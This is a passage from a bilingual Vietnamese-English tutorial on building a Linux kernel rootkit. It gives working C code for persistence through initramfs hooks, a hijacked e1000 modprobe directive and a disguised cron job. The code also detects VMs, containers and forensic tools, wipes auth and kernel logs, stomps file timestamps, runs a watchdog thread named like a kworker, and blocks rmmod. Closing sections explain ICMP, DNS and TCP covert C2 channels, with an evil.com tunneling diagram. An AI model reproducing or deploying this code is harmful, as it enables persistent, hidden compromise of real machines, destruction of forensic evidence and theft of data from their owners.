 * initramfs = temporary root filesystem loaded by bootloader.
 * Kernel mounts initramfs → runs /init → mounts real root.
 * Module loaded từ initramfs chạy TRƯỚC mọi thứ.
 *
 * Survive: kernel updates (nếu hook update-initramfs)
 * ══════════════════════════════════════════════════════════════ */
static void persist_initramfs(const char *module_name,
                               const char *ko_path)
{
    char cmd[2048];

    snprintf(cmd, sizeof(cmd),
        /* 1. Copy module vào initramfs staging area */
        "mkdir -p /etc/initramfs-tools/modules.d/ 2>/dev/null; "
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "

        /* 2. Create hook script cho initramfs-tools (Debian/Ubuntu) */
        "cat > /etc/initramfs-tools/hooks/firmware-mod << 'HOOKEOF'\n"
        "#!/bin/sh\n"
        "PREREQ=\"\"\n"
        "prereqs() { echo \"$PREREQ\"; }\n"
        "case $1 in prereqs) prereqs; exit 0;; esac\n"
        ". /usr/share/initramfs-tools/hook-functions\n"
        "manual_add_modules %s\n"
        "HOOKEOF\n"
        "chmod +x /etc/initramfs-tools/hooks/firmware-mod; "

        /* 3. Add module to load list */
        "echo '%s' >> /etc/initramfs-tools/modules; "

        /* 4. Rebuild initramfs */
        "update-initramfs -u -k $(uname -r) 2>/dev/null; "
        /* Dracut equivalent (RHEL/Fedora): */
        "dracut --force 2>/dev/null || true",

        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 6: Infect existing module — Parasitic persistence
 *
 * Stealth: VERY HIGH (no new files)
 * Reliability: MEDIUM (module signature may fail)
 *
 * Modify existing commonly-loaded module's init function
 * để load rootkit module trước khi thực hiện chức năng gốc.
 *
 * Target modules tốt: e1000, virtio_net (network drivers)
 * → Luôn load sớm, essential → admin không disable.
 *
 * Implementation: append insmod command vào module's
 * modprobe.d config instead of modifying binary.
 * ══════════════════════════════════════════════════════════════ */
static void persist_parasitic(const char *module_name,
                               const char *ko_path)
{
    char cmd[1024];

    /* Dùng modprobe.d install directive:
     * "install target_module" thay thế default modprobe behavior.
     * install line can run arbitrary commands THEN load module.
     *
     * Ví dụ: khi hệ thống modprobe e1000 (ethernet driver):
     *   1. modprobe đọc /etc/modprobe.d/e1000.conf
     *   2. Thấy install directive
     *   3. Chạy command: insmod rootkit.ko; modprobe --ignore-install e1000
     *   4. Rootkit loaded TRƯỚC network driver */
    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        "echo 'install e1000 "
        "/sbin/insmod /lib/modules/'$(uname -r)'/extra/%s.ko 2>/dev/null; "
        "/sbin/modprobe --ignore-install e1000' "
        "> /etc/modprobe.d/e1000.conf",
        ko_path, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * METHOD 7: Crontab — Simple timer-based
 *
 * Stealth: LOW (crontab -l shows it)
 * Reliability: MEDIUM (cron phải chạy)
 *
 * Check mỗi phút nếu module loaded, nếu không → load.
 * Survive rmmod (tự load lại sau 1 phút max).
 * ══════════════════════════════════════════════════════════════ */
static void persist_crontab(const char *module_name,
                             const char *ko_path)
{
    char cmd[1024];

    snprintf(cmd, sizeof(cmd),
        "cp %s /lib/modules/$(uname -r)/extra/%s.ko; "
        "depmod -a; "
        /* Add root crontab entry disguised as log rotation */
        "(crontab -l 2>/dev/null; "
        "echo '* * * * * "
        "lsmod | grep -q %s || /sbin/modprobe %s "
        "# log rotation check') | "
        "sort -u | crontab -",
        ko_path, module_name, module_name, module_name);

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ── Unified: install multiple persistence layers ── */
void rk_install_persistence(void)
{
    const char *mod_name = THIS_MODULE->name;
    char ko_path[256];

    /* Find current .ko file path.
     * Module file typically at:
     *   /lib/modules/KVER/extra/MODULE.ko
     * But khi dev: có thể ở bất kỳ đâu.
     * Dùng modinfo để find. */
    snprintf(ko_path, sizeof(ko_path),
             "/lib/modules/%s/extra/%s.ko",
             utsname()->release, mod_name);

    /* Install multiple layers cho redundancy */
    persist_systemd_service(mod_name, ko_path);
    persist_modules_load_d(mod_name, ko_path);
    persist_udev_rule(mod_name, ko_path);

    pr_info("rk: persistence installed (3 layers)\n");
}
```

---

## Chapter 13: Anti-Forensics & Self-Protection

### 13.0 Anti-Forensics Internals — Kernel subsystems to abuse

Anti-forensics trong kernel rootkit lam dung cac kernel subsystems de chong phan tich, xoa dau vet, va tu bao ve. Phan nay giai thich internals cua cac subsystems bi lam dung.

#### 13.0.1 CPUID Instruction — VM/Hypervisor detection

CPUID la x86 instruction cho phep query CPU features. Hypervisors PHAI expose su hien dien cua chung qua CPUID de guest OS hoat dong dung:

```
CPUID Detection Flow:

  ┌──────────────────────────────────────────────────────────┐
  │ CPUID voi EAX = 1 (Basic CPU Info)                       │
  │                                                          │
  │ Ket qua: ECX bit 31 = Hypervisor Present Bit             │
  │   0 = bare metal (hoac hypervisor an bit nay)            │
  │   1 = running inside hypervisor                          │
  │                                                          │
  │ Code: cpuid(1, &eax, &ebx, &ecx, &edx);                │
  │       bool vm = (ecx >> 31) & 1;                         │
  └──────────────────────────────────────────────────────────┘

  ┌──────────────────────────────────────────────────────────┐
  │ CPUID voi EAX = 0x40000000 (Hypervisor Vendor)          │
  │                                                          │
  │ Ket qua: EBX:ECX:EDX = 12-byte vendor string            │
  │ (Luu y: thu tu la EBX:ECX:EDX, KHONG phai EBX:EDX:ECX) │
  │                                                          │
  │ Vendor Strings:                                          │
  │ ┌────────────────┬──────────────────────┐                │
  │ │ "KVMKVMKVM\0\0\0" │ KVM                │                │
  │ │ "VMwareVMware"   │ VMware              │                │
  │ │ "Microsoft Hv"   │ Hyper-V             │                │
  │ │ "XenVMMXenVMM"   │ Xen                 │                │
  │ │ "VBoxVBoxVBox"   │ VirtualBox          │                │
  │ │ "TCGTCGTCGTCG"   │ QEMU (TCG mode)     │                │
  │ │ "bhyve bhyve "   │ bhyve (FreeBSD)     │                │
  │ └────────────────┴──────────────────────┘                │
  │                                                          │
  │ EAX return = max hypervisor CPUID leaf supported         │
  └──────────────────────────────────────────────────────────┘

  Anti-detection luu y:
  ┌──────────────────────────────────────────────────────────┐
  │ Nhieu production servers chay trong VM (AWS EC2, GCP,    │
  │ Azure VM). Neu rootkit EXIT khi detect VM → mat target.  │
  │                                                          │
  │ Strategy dung: THAY DOI BEHAVIOR khi detect VM,          │
  │ KHONG exit/crash (vi do cung la indicator cho analyst).  │
  │   - Disable aggressive features                          │
  │   - Giu passive monitoring only                          │
  │   - Reduce logging/network activity                      │
  └──────────────────────────────────────────────────────────┘
```

#### 13.0.2 Kernel Timer va Workqueue Internals

Rootkit dung timers va workqueues cho periodic tasks (watchdog, self-check, delayed actions). Hieu co che nay giup hieu code trong watchdog_fn va self-protection:

```
  Kernel Timers va Jiffies:
  ┌──────────────────────────────────────────────────────────┐
  │ Jiffies = kernel tick counter (unsigned long)             │
  │   - Increment moi HZ lAN/giay                            │
  │   - HZ = 250 (default) hoac 1000 (low-latency config)   │
  │   - 1 jiffy = 1/HZ giay = 4ms (HZ=250) hoac 1ms        │
  │                                                          │
  │ Conversion:                                              │
  │   msecs_to_jiffies(5000)  = 5 seconds in jiffies         │
  │   HZ * 30                 = 30 seconds in jiffies        │
  │   jiffies_to_msecs(j)     = convert back to milliseconds │
  └──────────────────────────────────────────────────────────┘

  Delayed Work (workqueue):
  ┌──────────────────────────────────────────────────────────┐
  │ DECLARE_DELAYED_WORK(name, func)                         │
  │   → Compile-time declaration cua delayed work item       │
  │                                                          │
  │ schedule_delayed_work(&work, delay_jiffies)              │
  │   → queue_delayed_work(system_wq, &work, delay)          │
  │     → Internal timer set cho delay jiffies               │
  │     → Khi timer fires:                                   │
  │        work function chay trong PROCESS CONTEXT           │
  │        (co the sleep! khac voi timer callback)           │
  │                                                          │
  │ system_wq = kernel's default workqueue                   │
  │   Threads: kworker/CPU:ID                                │
  │   Rootkit dung ten "kworker/0:1" de disguise threads    │
  └──────────────────────────────────────────────────────────┘

  Process context vs Interrupt context:
  ┌──────────────┬───────────────────┬───────────────────────┐
  │              │ Process context   │ Interrupt context     │
  ├──────────────┼───────────────────┼───────────────────────┤
  │ Sleep?       │ YES (can sleep)   │ NO (must not sleep)   │
  │ schedule()?  │ YES               │ NO                    │
  │ Allocate?    │ GFP_KERNEL ok     │ GFP_ATOMIC only       │
  │ Access user? │ copy_to/from_user │ NO                    │
  │ Preemptible? │ YES               │ NO                    │
  │ Example      │ workqueue func,   │ timer callback,       │
  │              │ kthread, syscall  │ IRQ handler, softirq  │
  └──────────────┴───────────────────┴───────────────────────┘

  schedule_timeout_interruptible(delay):
    - Sleep cho delay jiffies
    - Wake up TRUOC han neu co signal (kthread_stop gui signal)
    - Return: so jiffies con lai (0 neu het timeout)
    - Dung cho watchdog: sleep 30*HZ, check, lap lai
```

#### 13.0.3 Kernel Log System — printk va ring buffer

```
  Kernel Logging Pipeline:

  printk("rk: module loaded\n")
       │
       ▼
  log_buf (ring buffer trong kernel memory)
  ┌──────────────────────────────────────────────┐
  │ Ring buffer, default size: __LOG_BUF_LEN     │
  │ (256KB default, configurable via log_buf_len │
  │  kernel parameter)                           │
  │                                              │
  │ Structure: moi entry co:                     │
  │   - timestamp (nanoseconds)                  │
  │   - log level (0-7, KERN_EMERG..KERN_DEBUG) │
  │   - facility                                 │
  │   - message text                             │
  │   - sequence number (monotonic)              │
  │                                              │
  │ Ring behavior: khi FULL → overwrite entries  │
  │ cu nhat (FIFO eviction)                      │
  └──────────┬────────────────┬──────────────────┘
             │                │
      ┌──────┘                └──────┐
      ▼                              ▼
  /dev/kmsg                     /proc/kmsg
  (structured read,             (blocking read,
   seekable, per-read           legacy interface,
   metadata)                    consumed on read)
      │                              │
      ▼                              ▼
  systemd-journald              klogd/syslog
  → /var/log/journal/           → /var/log/kern.log
                                → /var/log/syslog

  dmesg command:
    dmesg = doc /dev/kmsg (modern) hoac syslog() syscall
    dmesg -C = clear ring buffer (SYSLOG_ACTION_CLEAR)
    dmesg -n 1 = set console log level (chi show EMERG)

  Rootkit co the:
  ┌──────────────────────────────────────────────────────────┐
  │ 1. Clear buffer: dmesg -C (xoa vet "module loaded")     │
  │ 2. Hook syslog() syscall: filter output cho userspace   │
  │ 3. Hook printk: prevent logging tu ban dau              │
  │ 4. Modify log_buf truc tiep: edit/remove entries        │
  │ 5. Set console loglevel cao: suppress kernel messages   │
  │ 6. Truncate log files: /var/log/kern.log, auth.log      │
  │ 7. journalctl --vacuum: xoa journal entries              │
  └──────────────────────────────────────────────────────────┘
```

---

```c
/* anti_forensics.c — Chống phân tích và tự bảo vệ
 *
 * 5 categories:
 *   1. VM/Sandbox detection
 *   2. Anti-debugging
 *   3. Log tampering
 *   4. Timestamp manipulation
 *   5. Self-protection (prevent removal)
 */

#include "rootkit.h"
#include <linux/kthread.h>
#include <linux/utsname.h>

/* ══════════════════════════════════════════════════════════════
 * 1. VM & CONTAINER DETECTION
 *
 * Tại sao detect: sandbox = analyst đang phân tích rootkit.
 * Behavior: thay đổi behavior khi phát hiện (không crash/exit
 * vì đó cũng là indicator).
 * ══════════════════════════════════════════════════════════════ */

static bool rk_detect_hypervisor(void)
{
    unsigned int eax, ebx, ecx, edx;

    /* CPUID leaf 1, ECX bit 31 = Hypervisor Present Bit.
     * Nếu = 1 → chạy trong VM.
     * VMware, KVM, Xen, Hyper-V đều set bit này. */
    cpuid(1, &eax, &ebx, &ecx, &edx);
    return (ecx >> 31) & 1;
}

static bool rk_detect_vm_vendor(void)
{
    unsigned int eax, ebx, ecx, edx;
    char vendor[13];

    /* CPUID leaf 0x40000000 = Hypervisor vendor string.
     * Kết quả trong EBX:EDX:ECX (12 bytes). */
    cpuid(0x40000000, &eax, &ebx, &ecx, &edx);
    memcpy(vendor + 0, &ebx, 4);
    memcpy(vendor + 4, &ecx, 4);
    memcpy(vendor + 8, &edx, 4);
    vendor[12] = '\0';

    /* Known vendors:
     *   "VMwareVMware" → VMware
     *   "KVMKVMKVM\0\0\0" → KVM
     *   "Microsoft Hv" → Hyper-V
     *   "XenVMMXenVMM" → Xen
     *   "VBoxVBoxVBox" → VirtualBox
     */
    if (strstr(vendor, "VMware") || strstr(vendor, "KVM") ||
        strstr(vendor, "Microsoft") || strstr(vendor, "Xen") ||
        strstr(vendor, "VBox"))
        return true;

    return false;
}

static bool rk_detect_container(void)
{
    struct file *f;

    /* Docker creates /.dockerenv */
    f = filp_open("/.dockerenv", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        filp_close(f, NULL);
        return true;
    }

    /* Podman/containerd: check cgroup */
    f = filp_open("/proc/1/cgroup", O_RDONLY, 0);
    if (!IS_ERR(f)) {
        char buf[512];
        loff_t pos = 0;
        ssize_t bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos);
        filp_close(f, NULL);

        if (bytes > 0) {
            buf[bytes] = '\0';
            if (strstr(buf, "docker") || strstr(buf, "lxc") ||
                strstr(buf, "kubepods") || strstr(buf, "containerd"))
                return true;
        }
    }

    return false;
}

static bool rk_detect_analysis_tools(void)
{
    struct task_struct *task;
    bool found = false;

    /* Scan process list cho known forensics/analysis tools */
    rcu_read_lock();
    for_each_process(task) {
        if (strcmp(task->comm, "rkhunter") == 0 ||
            strcmp(task->comm, "chkrootkit") == 0 ||
            strcmp(task->comm, "aide") == 0 ||
            strcmp(task->comm, "ossec") == 0 ||
            strcmp(task->comm, "volatility") == 0 ||
            strcmp(task->comm, "lime") == 0 ||
            strcmp(task->comm, "bpftool") == 0 ||
            strcmp(task->comm, "sysdig") == 0 ||
            strcmp(task->comm, "falco") == 0 ||
            strcmp(task->comm, "tracee") == 0 ||
            strcmp(task->comm, "strace") == 0 ||
            strcmp(task->comm, "ltrace") == 0 ||
            strcmp(task->comm, "gdb") == 0) {
            found = true;
            break;
        }
    }
    rcu_read_unlock();

    return found;
}

/* Unified environment check — gọi lúc init */
bool rk_environment_safe(void)
{
    bool vm = rk_detect_hypervisor() || rk_detect_vm_vendor();
    bool container = rk_detect_container();
    bool tools = rk_detect_analysis_tools();

    if (tools) {
        pr_info("rk: analysis tools detected — adjusting behavior\n");
        /* Không exit (đó cũng là indicator).
         * Thay đổi behavior: disable aggressive features,
         * chỉ giữ passive monitoring. */
        return false;
    }

    /* VM = có thể lab, có thể production VM.
     * Nhiều servers chạy trong VM → không nên block.
     * Log nhưng không thay đổi behavior. */
    if (vm)
        pr_info("rk: running in VM\n");
    if (container)
        pr_info("rk: running in container\n");

    return true;
}

/* ══════════════════════════════════════════════════════════════
 * 2. ANTI-DEBUGGING
 *
 * Detect nếu có debugger/tracer attach vào rootkit module.
 * ══════════════════════════════════════════════════════════════ */

static bool rk_detect_kprobes_on_us(void)
{
    /* Check nếu có kprobes registered trên OUR functions.
     * /sys/kernel/debug/kprobes/list chứa all active probes.
     * Nếu ai đặt probe trên rootkit function → đang debug. */
    struct file *f;
    char buf[4096];
    loff_t pos = 0;
    ssize_t bytes;

    f = filp_open("/sys/kernel/debug/kprobes/list", O_RDONLY, 0);
    if (IS_ERR(f)) return false;

    bytes = kernel_read(f, buf, sizeof(buf) - 1, &pos);
    filp_close(f, NULL);

    if (bytes > 0) {
        buf[bytes] = '\0';
        /* Check nếu có probe trên rootkit's module address range.
         * Kernel 6.4+: core_layout removed → dung module->mem[MOD_TEXT].
         * Compat macro MOD_BASE/MOD_SIZE defined trong rootkit.h. */
        unsigned long mod_start = (unsigned long)MOD_BASE(THIS_MODULE);
        unsigned long mod_end   = mod_start + MOD_SIZE(THIS_MODULE);

        /* Parse mỗi dòng: "ADDR  STATUS  SYMBOL+OFFSET"
         * Nếu ADDR nằm trong module range → probe trên ta. */
        char *line = buf;
        while (line && *line) {
            unsigned long addr;
            if (kstrtoul(line, 16, &addr) == 0) {
                if (addr >= mod_start && addr < mod_end)
                    return true;
            }
            line = strchr(line, '\n');
            if (line) line++;
        }
    }

    return false;
}

static bool rk_timing_check(void)
{
    /* rdtsc timing check: đo time thực hiện code block.
     * Nếu lâu bất thường → breakpoint/single-step active.
     *
     * Normal: ~100-500 cycles
     * With debugger: >10000 cycles (INT3 trap overhead) */
    unsigned long long start, end;
    unsigned int dummy;

    start = __rdtscp(&dummy);

    /* Noop code — measure baseline */
    asm volatile("nop; nop; nop; nop; nop; nop; nop; nop;");
    asm volatile("nop; nop; nop; nop; nop; nop; nop; nop;");

    end = __rdtscp(&dummy);

    return (end - start > 10000);  /* Threshold */
}

/* ══════════════════════════════════════════════════════════════
 * 3. LOG TAMPERING
 * ══════════════════════════════════════════════════════════════ */

void rk_clear_dmesg(void)
{
    /* Clear kernel ring buffer.
     * dmesg -C equivalent từ kernel. */
    char *argv[] = { "/bin/dmesg", "-C", NULL };
    char *envp[] = { "PATH=/usr/bin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static void rk_clear_auth_logs(void)
{
    char *cmd =
        "truncate -s 0 /var/log/auth.log 2>/dev/null; "
        "truncate -s 0 /var/log/secure 2>/dev/null; "
        "truncate -s 0 /var/log/kern.log 2>/dev/null; "
        "journalctl --vacuum-time=1s 2>/dev/null";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

/* ══════════════════════════════════════════════════════════════
 * 4. TIMESTAMP MANIPULATION — Stomp file timestamps
 * ══════════════════════════════════════════════════════════════ */

static void rk_timestomp(const char *filepath, struct timespec64 *ts)
{
    struct file *f;
    struct inode *inode;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) return;

    inode = file_inode(f);
    if (inode) {
        /* Modify inode timestamps trực tiếp.
         * atime = last access
         * mtime = last modification
         * ctime = last status change (cannot be set via utimensat,
         *         nhưng kernel code CAN modify trực tiếp)
         *
         * KERNEL 6.6+: i_atime/i_mtime/i_ctime khong assignable truc tiep.
         * Phai dung accessor macros: inode_set_atime_to_ts(), etc. */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 6, 0)
        inode_set_atime_to_ts(inode, *ts);
        inode_set_mtime_to_ts(inode, *ts);
        inode_set_ctime_to_ts(inode, *ts);
#else
        inode->i_atime = *ts;
        inode->i_mtime = *ts;
        inode->i_ctime = *ts;
#endif

        /* Mark inode dirty để filesystem write changes. */
        mark_inode_dirty(inode);
    }

    filp_close(f, NULL);
}

/* Stomp rootkit files tới match timestamp của /bin/ls */
void rk_timestomp_rootkit_files(void)
{
    struct file *ref;
    struct inode *ref_inode;
    struct timespec64 ts;

    /* Lấy timestamp reference từ /bin/ls (file hệ thống cũ) */
    ref = filp_open("/bin/ls", O_RDONLY, 0);
    if (IS_ERR(ref)) return;

    ref_inode = file_inode(ref);
    if (ref_inode) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 6, 0)
        ts = inode_get_mtime(ref_inode);
#else
        ts = ref_inode->i_mtime;
#endif

        /* Stomp rootkit files */
        rk_timestomp("/lib/modules/" UTS_RELEASE "/extra/rk.ko", &ts);
        rk_timestomp("/etc/modules-load.d/rk.conf", &ts);
    }

    filp_close(ref, NULL);
}

/* ══════════════════════════════════════════════════════════════
 * 5. SELF-PROTECTION — Prevent removal
 * ══════════════════════════════════════════════════════════════ */

/* Watchdog thread: kiểm tra rootkit integrity.
 * Nếu hooks bị removed → reinstall.
 * Nếu rootkit files bị xóa → recreate.
 * Nếu persistence bị xóa → reinstall. */
static struct task_struct *watchdog = NULL;

static int watchdog_fn(void *data)
{
    while (!kthread_should_stop()) {
        /* Check 1: hooks vẫn intact
         * Verify syscall table entries vẫn trỏ tới hook functions.
         * Nếu ai đó restore original → reinstall hooks. */
        if (sys_call_table &&
            sys_call_table[__NR_getdents64] != (unsigned long)hooked_getdents64) {
            pr_warn("rk: hooks tampered, reinstalling\n");
            rk_install_hooks();
        }

        /* Check 2: module code integrity
         * Goi rk_integrity_check() (Appendix F) để verify
         * hash cua code pages khong bi modify (anti-patching). */
        if (rk_integrity_check && rk_integrity_check()) {
            pr_warn("rk: code integrity violation detected\n");
        }

        /* Check 3: persistence files tồn tại */
        struct file *f;
        f = filp_open("/etc/modules-load.d/rk.conf", O_RDONLY, 0);
        if (IS_ERR(f)) {
            /* Persistence bị xóa → reinstall */
            rk_install_persistence();
        } else {
            filp_close(f, NULL);
        }

        /* Sleep 30 giây rồi check lại.
         * schedule_timeout_interruptible: sleep nhưng có thể bị
         * wakeup bởi signal (kthread_stop gửi signal). */
        schedule_timeout_interruptible(30 * HZ);
    }
    return 0;
}

void rk_start_watchdog(void)
{
    /* Thread name disguised: "kworker/0:1" looks like kernel worker.
     * Real kworkers: kworker/CPU:ID.
     * Forensics detection: check /proc/PID/stack — rootkit thread
     * has unusual stack (schedule_timeout_interruptible in watchdog_fn
     * vs real kworker in worker_thread→process_one_work). */
    watchdog = kthread_run(watchdog_fn, NULL, "kworker/0:1");
    if (IS_ERR(watchdog))
        watchdog = NULL;
}

void rk_stop_watchdog(void)
{
    if (watchdog) {
        kthread_stop(watchdog);
        watchdog = NULL;
    }
}

/* Block rmmod qua delete_module hook.
 * (Hooked via ftrace/syscall table — Chapter 3/4 methods) */
static asmlinkage long (*orig_delete_module)(const struct pt_regs *);

static asmlinkage long hooked_delete_module(const struct pt_regs *regs)
{
    char __user *name_user = (char __user *)regs->di;
    char name[MODULE_NAME_LEN];

    if (strncpy_from_user(name, name_user, MODULE_NAME_LEN) > 0) {
        if (strstr(name, THIS_MODULE->name)) {
            /* Block removal — return EBUSY (device busy) */
            return -EBUSY;
        }
    }
    return orig_delete_module(regs);
}
```

---

## Chapter 14: Covert Communication & C2

### 14.0 Protocol Internals — ICMP, DNS, TCP deep dive

C2 (Command and Control) channels cua rootkit su dung cac network protocols de giao tiep voi attacker's server. Hieu cau truc cua cac protocol nay la nen tang de hieu tai sao chung duoc chon va cach rootkit nhung data vao traffic hop phap.

#### 14.0.1 ICMP Packet Format (RFC 792)

ICMP (Internet Control Message Protocol) duoc thiet ke cho network diagnostics (ping, traceroute). Firewall THUONG cho ICMP qua, va ICMP Echo Request/Reply co PAYLOAD FIELD cho phep nhung data tuy y:

```
  ICMP Echo Request/Reply Packet:

  ┌─────────────────────────────────────────────────────────────┐
  │                    IP Header (20 bytes)                      │
  │  Version│IHL│TOS│Total Len│ID│Flags│Frag│TTL│Proto=1│Chksum│
  │  Src IP │ Dst IP                                            │
  ├─────────────────────────────────────────────────────────────┤
  │                   ICMP Header (8 bytes)                      │
  │                                                             │
  │  ┌──────────┬──────────┬─────────────────────────────────┐  │
  │  │ Type (8) │ Code (8) │       Checksum (16)             │  │
  │  ├──────────┴──────────┼─────────────────────────────────┤  │
  │  │   Identifier (16)   │     Sequence Number (16)        │  │
  │  ├─────────────────────┴─────────────────────────────────┤  │
  │  │                                                       │  │
  │  │              Data / Payload                           │  │
  │  │         (variable length, max ~65507 bytes)           │  │
  │  │                                                       │  │
  │  │    ← ROOTKIT NHUNG C2 DATA O DAY                     │  │
  │  │                                                       │  │
  │  └───────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────┘

  ICMP Types su dung:
  ┌──────┬────────────────────┬──────────────────────────────┐
  │ Type │ Ten                │ Rootkit use                  │
  ├──────┼────────────────────┼──────────────────────────────┤
  │  8   │ Echo Request       │ Outbound: exfil data trong   │
  │      │                    │ payload, gui toi C2 server   │
  │  0   │ Echo Reply         │ Inbound: nhan commands tu    │
  │      │                    │ C2 server trong reply payload│
  └──────┴────────────────────┴──────────────────────────────┘

  Checksum calculation:
    ICMP checksum covers TOAN BO ICMP message (header + data).
    Algorithm: 16-bit one's complement of one's complement sum.
    icmp->checksum = 0;
    icmp->checksum = ip_compute_csum(packet, total_len);

  Tai sao ICMP tunnel hieu qua:
    - Firewall allow ICMP (can cho network diagnostics)
    - IDS thay "ping" → low priority alert
    - Payload size bien thien (32-1400 bytes) → hard to signature
    - Identifier field dung lam channel marker (0x1337)
    - ping -s 1400 (1400 byte payload) la HOAN TOAN HOP PHAP
```

#### 14.0.2 DNS Packet Format (RFC 1035)

DNS traffic HOAN TOAN KHONG BI BLOCK (essential service). Rootkit encode data trong subdomain labels cua DNS queries:

```
  DNS Packet Structure:

  ┌─── Header (12 bytes) ──────────────────────────────────────┐
  │                                                             │
  │  ┌──────────────┬──────────────────────────────────────┐   │
  │  │   ID (16)    │           Flags (16)                 │   │
  │  ├──────────────┼──────────────────────────────────────┤   │
  │  │  QD Count    │         AN Count (16)                │   │
  │  │  (16)        │                                      │   │
  │  ├──────────────┼──────────────────────────────────────┤   │
  │  │  NS Count    │         AR Count (16)                │   │
  │  │  (16)        │                                      │   │
  │  └──────────────┴──────────────────────────────────────┘   │
  │                                                             │
  │  Flags bits:                                                │
  │    QR(1)=query/response  OPCODE(4)  AA(1) TC(1) RD(1)     │
  │    RA(1) Z(3) RCODE(4)                                     │
  │                                                             │
  ├─── Question Section ───────────────────────────────────────┤
  │                                                             │
  │  QNAME: Label-encoded domain name                          │
  │    www.google.com → [3]www[6]google[3]com[0]               │
  │                      ^len ^label           ^root           │
  │                                                             │
  │    Encoding rules:                                          │
  │    - Moi label bat dau voi length byte                     │
  │    - Max 63 bytes per label                                │
  │    - Max 253 bytes total domain name                       │
  │    - Terminated boi null byte (root label)                 │
  │                                                             │
  │  QTYPE (16): Record type (A=1, AAAA=28, TXT=16, etc.)    │
  │  QCLASS (16): Class (IN=1 for Internet)                    │
  │                                                             │
  ├─── Answer Section ─────────────────────────────────────────┤
  │                                                             │
  │  NAME: domain name (often pointer: 0xC0 + offset)         │
  │  TYPE (16)  │  CLASS (16)  │  TTL (32)                    │
  │  RDLENGTH (16)  │  RDATA (variable)                       │
  │                                                             │
  │  TXT Record RDATA:                                         │
  │    [txt_length][text_data...]                               │
  │    ← C2 server tra commands trong TXT record RDATA         │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘

  DNS Tunneling Data Flow:

  ┌─────────────┐                          ┌──────────────────┐
  │   Rootkit    │                          │   C2 Server      │
  │  (infected   │                          │  (authoritative  │
  │   host)      │                          │   DNS for        │
  │              │                          │   evil.com)      │
  └──────┬───────┘                          └────────┬─────────┘
         │                                           │
         │  1. DNS Query: hex_data.evil.com          │
         │  ────────────────────────────────────────> │
         │     Data = hex-encoded in subdomain        │
         │     Max ~180 bytes per query               │
         │     (63-char label * 3 labels - overhead)  │
         │                                           │
         │  2. DNS Response: TXT record               │
         │  <──────────────────────────────────────── │
         │     Command = text in TXT RDATA            │
         │     Max ~255 bytes per TXT record          │
         │                                           │

  Tai sao DNS tunnel:
    - DNS LUON duoc allow (essential service)
    - Di qua proxy/firewall
    - Corporate DNS resolvers forward query toi C2's authoritative NS
    - Low bandwidth nhung stealth CAO
    - SUNBURST (SolarWinds) da su dung DNS tunneling
```

#### 14.0.3 TCP Options — Passive data exfiltration

TCP header va options chua nhieu fields co the bi lam dung de nhung data ma khong thay doi application-layer traffic:

```
  TCP Header (20 bytes minimum, up to 60 with options):

  ┌─────────────────────────────────────────────────────────────┐
  │  ┌────────────────────┬────────────────────┐               │
  │  │ Source Port (16)   │ Dest Port (16)     │               │
  │  ├────────────────────┴────────────────────┤               │
  │  │           Sequence Number (32)           │  ← ISN       │
  │  │                                          │  steganography│
  │  ├──────────────────────────────────────────┤               │
  │  │         Acknowledgment Number (32)       │               │
  │  ├────┬──────┬──────┬──────────────────────┤               │
  │  │Data│Rsvd│ Flags  │    Window (16)        │               │
  │  │Off │(3) │ (9)    │                      │               │
  │  │(4) │    │NCEUAPRSF                      │               │
  │  │    │    │NS CWR ECE URG ACK PSH RST SYN FIN             │
  │  ├────┴──────┴──────┼──────────────────────┤               │
  │  │  Checksum (16)   │ Urgent Pointer (16)  │               │
  │  ├──────────────────┴──────────────────────┤               │
  │  │         Options (variable, 0-40 bytes)   │               │
  │  └──────────────────────────────────────────┘               │
  └─────────────────────────────────────────────────────────────┘

  TCP Options Format:
  ┌──────────────────────────────────────────────────────────┐
  │ Kind=0: End of options (1 byte, no length/data)         │
  │ Kind=1: NOP padding (1 byte, no length/data)            │
  │ Kind=2: MSS (len=4, 2 bytes MSS value)                  │
  │ Kind=3: Window Scale (len=3, 1 byte shift count)        │
  │ Kind=4: SACK Permitted (len=2)                          │
  │ Kind=5: SACK blocks (variable)                          │
  │ Kind=8: Timestamps (len=10)                             │
  │         ┌──────┬──────┬──────────┬──────────┐           │
  │         │Kind=8│Len=10│ TSval(32)│TSecr(32) │           │
  │         └──────┴──────┴──────────┴──────────┘           │
  │                                   ^^^^^^^^^^            │
  │                        Rootkit embeds data HERE          │
  │                        (TSecr = timestamp echo reply)   │
  └──────────────────────────────────────────────────────────┘

  Steganography Channels trong TCP:

  1. ISN (Initial Sequence Number):
     ┌────────────────────────────────────────────────────────┐
     │ RFC yeu cau ISN "random" (chong prediction attacks)    │
     │ Rootkit THAY THE ISN bang encoded data (4 bytes/SYN)  │
     │ C2 server doc ISN tu received SYN packet               │
     │ Connection co the RST ngay → giong port scan           │
     │ Bandwidth: 4 bytes per connection attempt              │
     └────────────────────────────────────────────────────────┘

